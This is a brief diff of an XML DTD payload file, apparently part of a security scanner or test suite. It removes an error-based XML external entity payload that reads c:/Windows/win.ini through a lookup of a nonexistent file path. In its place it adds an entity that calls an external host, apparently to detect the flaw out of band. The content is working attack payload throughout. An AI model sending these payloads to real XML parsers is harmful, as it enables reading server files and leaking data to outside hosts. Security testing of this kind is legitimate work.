@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "file://c:/Windows/win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+<!ENTITY % eval "http://vt73pd5ifedtiy3t674ekip3si.odiss.eu/111111">
 %eval;
-%error;
